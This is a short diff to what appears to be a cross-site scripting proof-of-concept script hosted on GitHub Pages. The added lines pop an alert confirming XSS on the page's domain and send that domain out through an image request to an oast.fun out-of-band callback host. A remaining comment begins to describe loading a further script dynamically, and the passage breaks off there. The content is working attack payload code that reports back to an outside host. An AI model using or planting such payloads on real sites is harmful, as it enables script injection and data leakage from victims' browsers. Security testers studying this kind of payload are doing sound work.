@@ -1,4 +1,6 @@
-alert("XSS ✅ Auto Executed from GitHub Pages: " + document.domain);
+alert("✅ XSS Confirmed: " + document.domain);
+new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?x=" + document.domain;
+
 
 // You can optionally load another script dynamically too:
 var s = document.createElement('script');
